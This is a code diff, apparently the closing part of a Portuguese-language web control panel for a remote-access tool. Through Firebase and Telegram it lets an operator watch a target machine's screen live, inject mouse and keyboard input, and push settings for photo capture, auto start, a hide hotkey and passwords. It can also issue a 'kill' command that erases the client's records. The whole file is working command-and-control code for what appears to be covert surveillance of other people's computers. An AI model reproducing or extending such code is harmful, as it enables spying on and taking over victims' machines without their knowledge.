+            const elRatio = rect.width / rect.height;
+            let renderWidth, renderHeight, xOffset = 0, yOffset = 0;
+
+            if (imgRatio > elRatio) {
+                renderWidth = rect.width;
+                renderHeight = rect.width / imgRatio;
+                yOffset = (rect.height - renderHeight) / 2;
+            } else {
+                renderHeight = rect.height;
+                renderWidth = rect.height * imgRatio;
+                xOffset = (rect.width - renderWidth) / 2;
+            }
+
+            let clientX = event.clientX != null ? event.clientX : event.touches[0].clientX;
+            let clientY = event.clientY != null ? event.clientY : event.touches[0].clientY;
+
+            const x = clientX - rect.left - xOffset;
+            const y = clientY - rect.top - yOffset;
+
+            if (x < 0 || x > renderWidth || y < 0 || y > renderHeight) return null;
+
+            return { relX: x / renderWidth, relY: y / renderHeight };
+        }
+
+        async function sendMouseCommand(action, e) {
+            if(!controlMode || !currentStreamUrl) return;
+            
+            if(action === 'move' && Date.now() - lastMoveTime < 40) return; 
+            if(action === 'move') lastMoveTime = Date.now();
+
+            const coords = getRelativeCoords(e);
+            if(!coords) return;
+
+            const endpoint = currentStreamUrl.replace('/stream.mjpg', '/input');
+            
+            const fetchOptions = {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: action, x: coords.relX, y: coords.relY })
+            };
+
+            try {
+                if (action === 'move') {
+                    if (moveAbortController) moveAbortController.abort();
+                    moveAbortController = new AbortController();
+                    fetchOptions.signal = moveAbortController.signal;
+                }
+                fetch(endpoint, fetchOptions).catch((err)=>{});
+            } catch(err) {}
+        }
+
+        // MOSTRA FEEDBACK VISUAL NA TELA
+        function showKeyFeedback(keyStr) {
+            const fb = document.getElementById('key-feedback');
+            fb.innerText = keyStr.length === 1 ? keyStr.toUpperCase() : keyStr;
+            fb.classList.remove('hidden');
+            fb.style.opacity = '1';
+            clearTimeout(window.keyFbTimeout);
+            window.keyFbTimeout = setTimeout(() => {
+                fb.style.opacity = '0';
+            }, 400);
+        }
+
+        // FUNÇÃO DE TECLADO
+        async function sendKeyCommand(action, e) {
+            if(!keyboardControlMode || !currentStreamUrl) return;
+
+            let keyName = e.key;
+            
+            const keyMap = {
+                ' ': 'space', 'Spacebar': 'space',
+                'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift',
+                'Meta': 'cmd', 'OS': 'cmd', 'Enter': 'enter',
+                'Backspace': 'backspace', 'Tab': 'tab', 'Escape': 'esc',
+                'ArrowUp': 'up', 'ArrowDown': 'down_arrow', 
+                'ArrowLeft': 'left', 'ArrowRight': 'right',
+                'CapsLock': 'caps_lock', 'Delete': 'delete',
+                'Home': 'home', 'End': 'end', 'PageUp': 'page_up', 'PageDown': 'page_down',
+                'Insert': 'insert',
+                'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4', 'F5': 'f5', 'F6': 'f6',
+                'F7': 'f7', 'F8': 'f8', 'F9': 'f9', 'F10': 'f10', 'F11': 'f11', 'F12': 'f12'
+            };
+
+            if (keyMap[e.key]) {
+                keyName = keyMap[e.key];
+            } else if (e.code === 'Space') {
+                keyName = 'space';
+            }
+
+            if (keyName.length > 1 && !Object.values(keyMap).includes(keyName)) {
+                return; 
+            }
+
+            const endpoint = currentStreamUrl.replace('/stream.mjpg', '/input');
+            
+            try {
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ action: action, key: keyName })
+                }).catch((err)=>{});
+            } catch(err) {}
+        }
+
+        // OUVINTES GLOBAIS DE TECLADO (COM ANTI-SPAM)
+        document.addEventListener('keydown', (e) => {
+            if(keyboardControlMode && !isRecordingHotkey && !document.getElementById('global-config-modal').classList.contains('flex') && !document.getElementById('config-modal').classList.contains('flex')) {
+                if (e.repeat) return;
+                e.preventDefault(); 
+                sendKeyCommand('keydown', e);
+                showKeyFeedback(e.key); 
+            }
+        }, {passive: false});
+
+        document.addEventListener('keyup', (e) => {
+            if(keyboardControlMode && !isRecordingHotkey && !document.getElementById('global-config-modal').classList.contains('flex') && !document.getElementById('config-modal').classList.contains('flex')) {
+                e.preventDefault();
+                sendKeyCommand('keyup', e);
+            }
+        }, {passive: false});
+
+        streamContainerInner.addEventListener('mousemove', (e) => {
+            if(controlMode) sendMouseCommand('move', e);
+        });
+        streamContainerInner.addEventListener('mousedown', (e) => {
+            if(controlMode) {
+                streamContainerInner.focus();
+                sendMouseCommand(e.button === 2 ? 'rclick' : 'down', e);
+            }
+        });
+        streamContainerInner.addEventListener('mouseup', (e) => {
+            if(controlMode && e.button === 0) sendMouseCommand('up', e);
+        });
+        streamContainerInner.addEventListener('contextmenu', (e) => {
+            e.preventDefault(); 
+        });
+
+        streamContainerInner.addEventListener('touchstart', (e) => {
+            if (controlMode) {
+                streamContainerInner.focus();
+                sendMouseCommand('down', e);
+            } else {
+                if (e.touches.length === 2) {
+                    isDragging = false;
+                    lastTouchDist = Math.hypot(e.touches[0].pageX - e.touches[1].pageX, e.touches[0].pageY - e.touches[1].pageY);
+                } else if (e.touches.length === 1 && zoomScale > 1) {
+                    isDragging = true;
+                    startPanPos = { x: e.touches[0].pageX - panPos.x, y: e.touches[0].pageY - panPos.y };
+                }
+            }
+        }, {passive: false});
+
+        streamContainerInner.addEventListener('touchmove', (e) => {
+            if (controlMode) {
+                e.preventDefault();
+                sendMouseCommand('move', e);
+            } else {
+                if (e.touches.length === 2) {
+                    e.preventDefault();
+                    const dist = Math.hypot(e.touches[0].pageX - e.touches[1].pageX, e.touches[0].pageY - e.touches[1].pageY);
+                    zoomScale = Math.min(Math.max(1, zoomScale + (dist - lastTouchDist) * 0.01), 6);
+                    lastTouchDist = dist;
+                    if (zoomScale === 1) panPos = {x: 0, y: 0};
+                    streamImg.style.transform = `translate(${panPos.x}px, ${panPos.y}px) scale(${zoomScale})`;
+                } else if (e.touches.length === 1 && isDragging) {
+                    e.preventDefault();
+                    panPos.x = e.touches[0].pageX - startPanPos.x;
+                    panPos.y = e.touches[0].pageY - startPanPos.y;
+                    streamImg.style.transform = `translate(${panPos.x}px, ${panPos.y}px) scale(${zoomScale})`;
+                }
+            }
+        }, {passive: false});
+
+        streamContainerInner.addEventListener('touchend', (e) => {
+            if(controlMode) sendMouseCommand('up', e);
+        });
+
+        streamContainerInner.addEventListener('wheel', (e) => {
+            if (!controlMode) {
+                e.preventDefault();
+                zoomScale = Math.min(Math.max(1, zoomScale - e.deltaY * 0.002), 6);
+                if (zoomScale === 1) panPos = {x: 0, y: 0};
+                streamImg.style.transform = `translate(${panPos.x}px, ${panPos.y}px) scale(${zoomScale})`;
+            }
+        }, {passive: false});
+
+        function resetStreamZoom() {
+            zoomScale = 1; 
+            panPos = {x:0, y:0};
+            streamImg.style.transform = `translate(0px, 0px) scale(1)`;
+        }
+
+        // === AJUSTES DE VÍDEO (ESTILO YOUTUBE) ===
+        async function updateStreamQuality() {
+            const q = parseInt(document.getElementById('stream-live-quality').value);
+            const r = parseInt(document.getElementById('stream-live-resolution').value);
+            
+            if(!currentStreamTarget) return;
+
+            const payload = { stream_quality: q, stream_resolution: r };
+            
+            let reqUrl = `${FB_URL}clients/${currentStreamTarget}/remote_config.json`;
+            let panelUrl = `${FB_URL}clients/${currentStreamTarget}/panel_config.json`;
+            if (FB_SECRET) { reqUrl += `?auth=${FB_SECRET}`; panelUrl += `?auth=${FB_SECRET}`; }
+            
+            try {
+                await fetch(reqUrl, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                await fetch(panelUrl, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                
+                if(window.clientsCache[currentStreamTarget] && window.clientsCache[currentStreamTarget].panel_config) {
+                    window.clientsCache[currentStreamTarget].panel_config.stream_quality = q;
+                    window.clientsCache[currentStreamTarget].panel_config.stream_resolution = r;
+                }
+            } catch(e) {}
+        }
+
+        function toggleFullScreenStream() {
+            const container = document.getElementById('stream-modal');
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                if (container.requestFullscreen) {
+                    container.requestFullscreen();
+                } else if (container.webkitRequestFullscreen) {
+                    container.webkitRequestFullscreen();
+                }
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                }
+            }
+        }
+
+        function openStreamModal(clientId) {
+            currentStreamTarget = clientId;
+            
+            const clientData = window.clientsCache[clientId] || {};
+            const cfg = clientData.panel_config || {};
+            const q = cfg.stream_quality || 60;
+            const r = cfg.stream_resolution || 70;
+            
+            document.getElementById('stream-live-quality').value = q;
+            document.getElementById('stream-live-resolution').value = r;
+            document.getElementById('stream-live-q-val').innerText = q;
+            document.getElementById('stream-live-r-val').innerText = r + '%';
+            document.getElementById('stream-settings-popup').classList.add('hidden'); 
+
+            document.getElementById('stream-modal').classList.remove('hidden');
+            resetStreamZoom();
+            updateStreamModalUI();
+        }
+
+        function closeStreamModal() {
+            document.getElementById('stream-modal').classList.add('hidden');
+            currentStreamTarget = '';
+            currentStreamUrl = '';
+            
+            const img = document.getElementById('live-stream-img');
+            img.removeAttribute('src'); 
+            document.getElementById('stream-status').innerText = "A aguardar conexão com o alvo...";
+            resetStreamZoom();
+            
+            if (controlMode) toggleControlMode(); 
+            if (keyboardControlMode) toggleKeyboardMode(); 
+            
+            if (document.fullscreenElement || document.webkitFullscreenElement) {
+                if (document.exitFullscreen) document.exitFullscreen();
+                else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+            }
+        }
+
+        async function sendCommand(clientId, cmdStr, btnElement) {
+            // Lógica visual do botão
+            if(btnElement) {
+                let originalText = btnElement.innerHTML;
+                btnElement.disabled = true;
+                btnElement.innerHTML = "A Executar...";
+                setTimeout(() => { if(btnElement) { btnElement.innerHTML = originalText; btnElement.disabled = false; } }, 3000);
+            }
+            
+            let reqUrl = `${FB_URL}clients/${clientId}/command.json?auth=${FB_SECRET}`;
+            try {
+                const res = await fetch(reqUrl, { 
+                    method: 'PUT', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ cmd: cmdStr, timestamp: new Date().toISOString() }) 
+                });
+                
+                // NOVO: TRATAMENTO EXCLUSIVO DO KILL SWITCH
+                if (res.ok && cmdStr === 'kill') {
+                    // 1. Marca imediatamente a máquina como "Morta" criando uma flag com Timestamp
+                    const nowTs = Date.now().toString();
+                    let killFlagUrl = `${FB_URL}clients/${clientId}/killedAt.json?auth=${FB_SECRET}`;
+                    await fetch(killFlagUrl, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: nowTs });
+                    
+                    // 2. Atualiza os dados na memória do browser e re-renderiza para o card desaparecer agora
+                    if (window.clientsCache[clientId]) {
+                        window.clientsCache[clientId].killedAt = nowTs;
+                    }
+                    renderClients(window.clientsCache);
+
+                    // 3. Dá tempo para o hospedeiro (máquina alvo) sincronizar e ler o comando, 
+                    //    e apenas passado esse tempo é que a DB do Firebase é apagada definitivamente.
+                    setTimeout(async () => {
+                        try {
+                            let deleteUrl = `${FB_URL}clients/${clientId}.json?auth=${FB_SECRET}`;
+                            await fetch(deleteUrl, { method: 'DELETE' });
+                        } catch(e) {}
+                    }, 180000); // Aguarda 3 minutos (180.000 ms)
+                    
+                    return; // Sai da função sem chamar a atualização genérica
+                }
+
+                setTimeout(fetchClients, 2000); 
+            } catch (err) {}
+        }
+
+        async function sendStreamCommand(clientId, cmdStr, btnElement) {
+            if(btnElement) {
+                let originalText = btnElement.innerHTML;
+                btnElement.disabled = true;
+                btnElement.innerHTML = "A Executar...";
+                setTimeout(() => { btnElement.innerHTML = originalText; btnElement.disabled = false; }, 3000);
+            }
+
+            let reqUrl = `${FB_URL}clients/${clientId}/command.json?auth=${FB_SECRET}`;
+            
+            if(cmdStr === 'stop_stream') {
+                fetch(`${FB_URL}clients/${clientId}/stream_url.json?auth=${FB_SECRET}`, {method: 'DELETE'});
+            }
+
+            await fetch(reqUrl, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cmd: cmdStr, timestamp: new Date().toISOString() }) });
+            setTimeout(fetchClients, 4000); 
+        }
+
+        function toggleHotkeyRecording() {
+            const btn = document.getElementById('btn_record_hk');
+            const input = document.getElementById('mod_hk');
+
+            if (!isRecordingHotkey) {
+                isRecordingHotkey = true;
+                recordedKeys.clear();
+                input.value = "A gravar... (pressione)";
+                btn.innerText = "Parar";
+                btn.classList.replace('bg-slate-800', 'bg-red-600');
+                btn.classList.replace('hover:bg-slate-700', 'hover:bg-red-500');
+                window.addEventListener('keydown', handleHotkeyRecord, {capture: true});
+            } else { stopHotkeyRecording(); }
+        }
+
+        function stopHotkeyRecording() {
+            isRecordingHotkey = false;
+            const btn = document.getElementById('btn_record_hk');
+            btn.innerText = "Gravar";
+            btn.classList.replace('bg-red-600', 'bg-slate-800');
+            btn.classList.replace('hover:bg-red-500', 'hover:bg-slate-700');
+            window.removeEventListener('keydown', handleHotkeyRecord, {capture: true});
+        }
+
+        function handleHotkeyRecord(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            let key = e.key.toLowerCase();
+            
+            if (key === 'control') key = '<ctrl>';
+            else if (key === 'alt') key = '<alt>';
+            else if (key === 'shift') key = '<shift>';
+            else if (key === 'meta' || key === 'os') key = '<cmd>';
+            else if (key === ' ') key = '<space>';
+            else if (key.length === 1) key = key;
+            else key = `<${key}>`;
+
+            recordedKeys.add(key);
+            
+            let arr = Array.from(recordedKeys);
+            arr.sort((a, b) => {
+                let isModA = a.startsWith('<');
+                let isModB = b.startsWith('<');
+                if (isModA && !isModB) return -1;
+                if (!isModA && isModB) return 1;
+                return a.localeCompare(b);
+            });
+            document.getElementById('mod_hk').value = arr.join('+');
+        }
+
+        function openConfigModal(clientId, currentDisplayName) {
+            currentTargetId = clientId;
+            document.getElementById('config-target-name').innerText = `Alvo Original: ${clientId}`;
+            
+            const clientData = window.clientsCache[clientId] || {};
+            const cfg = clientData.panel_config || {};
+            
+            document.getElementById('mod_use_fb').checked = cfg.use_firebase !== false;
+            document.getElementById('mod_use_tg').checked = cfg.use_telegram !== false; 
+            document.getElementById('mod_fb_url').value = cfg.firebase_url || "";
+            document.getElementById('mod_fb_secret').value = cfg.firebase_secret || "";
+            document.getElementById('mod_tg_token').value = cfg.telegram_token || "";
+            document.getElementById('mod_tg_chat').value = cfg.telegram_chat_id || "";
+            document.getElementById('mod_tg_kw').value = cfg.telegram_shutdown_keyword || "/desligar";
+            
+            document.getElementById('mod_custom_name').value = cfg.custom_name || (currentDisplayName !== clientId ? currentDisplayName : "");
+            
+            document.getElementById('mod_cap_mode').value = cfg.photo_capture_mode || "events";
+            document.getElementById('mod_cap_interval').value = cfg.photo_capture_interval || 60;
+            
+            document.getElementById('mod_app_pw').value = cfg.app_password || "1234";
+            document.getElementById('mod_local_lock').checked = cfg.login_protected || false;
+            
+            document.getElementById('mod_photo_quality').value = cfg.photo_quality || 90;
+            document.getElementById('mod_photo_resolution').value = cfg.photo_resolution || 100;
+            
+            document.getElementById('mod_sync').value = cfg.send_interval_min || 2;
+            document.getElementById('mod_photos').value = cfg.max_photos_limit || 12;
+            document.getElementById('mod_port').value = cfg.stream_port || 5555;
+            document.getElementById('mod_hk').value = cfg.hotkey_str || "<ctrl>+<alt>+h";
+            document.getElementById('mod_auto').checked = cfg.auto_start !== false;
+
+            document.getElementById('config-modal').classList.remove('hidden');
+            document.getElementById('config-modal').classList.add('flex');
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.add('hidden');
+            document.getElementById(modalId).classList.remove('flex');
+            if (isRecordingHotkey) stopHotkeyRecording();
+        }
+
+        async function pushRemoteConfig() {
+            if(!currentTargetId) return;
+            
+            const clientData = window.clientsCache[currentTargetId] || {};
+            const existingCfg = clientData.panel_config || {};
+
+            const configData = {
+                use_firebase: document.getElementById('mod_use_fb').checked, 
+                use_telegram: document.getElementById('mod_use_tg').checked,
+                telegram_token: document.getElementById('mod_tg_token').value.trim(),
+                telegram_chat_id: document.getElementById('mod_tg_chat').value.trim(),
+                telegram_shutdown_keyword: document.getElementById('mod_tg_kw').value.trim() || "/desligar",
+                
+                custom_name: document.getElementById('mod_custom_name').value.trim(),
+                
+                photo_capture_mode: document.getElementById('mod_cap_mode').value,
+                photo_capture_interval: parseInt(document.getElementById('mod_cap_interval').value) || 60,
+                
+                app_password: document.getElementById('mod_app_pw').value.trim() || "1234",
+                login_protected: document.getElementById('mod_local_lock').checked,
+                
+                photo_quality: parseInt(document.getElementById('mod_photo_quality').value) || 90,
+                photo_resolution: parseInt(document.getElementById('mod_photo_resolution').value) || 100,
+                
+                stream_quality: existingCfg.stream_quality || 60,
+                stream_resolution: existingCfg.stream_resolution || 70,
+                
+                send_interval_min: parseInt(document.getElementById('mod_sync').value) || 2,
+                max_photos_limit: parseInt(document.getElementById('mod_photos').value) || 12,
+                stream_port: parseInt(document.getElementById('mod_port').value) || 5555,
+                hotkey_str: document.getElementById('mod_hk').value,
+                auto_start: document.getElementById('mod_auto').checked,
+                
+                panel_url: globalAdminConfig.panel_url || "" 
+            };
+            
+            const newFbUrl = document.getElementById('mod_fb_url').value.trim();
+            const newFbSec = document.getElementById('mod_fb_secret').value.trim();
+            if (newFbUrl) configData.firebase_url = newFbUrl;
+            if (newFbSec) configData.firebase_secret = newFbSec;
+
+            let reqUrl = `${FB_URL}clients/${currentTargetId}/remote_config.json`;
+            let panelUrl = `${FB_URL}clients/${currentTargetId}/panel_config.json`;
+            if (FB_SECRET) { reqUrl += `?auth=${FB_SECRET}`; panelUrl += `?auth=${FB_SECRET}`; }
+
+            try {
+                await Promise.all([
+                    fetch(reqUrl, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(configData) }),
+                    fetch(panelUrl, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(configData) })
+                ]);
+                alert('Configurações injetadas com sucesso!');
+                closeModal('config-modal');
+                setTimeout(fetchClients, 1000); 
+            } catch(e) { alert('Falha ao injetar configuração.'); }
+        }
+    </script>
+</body>
+</html>
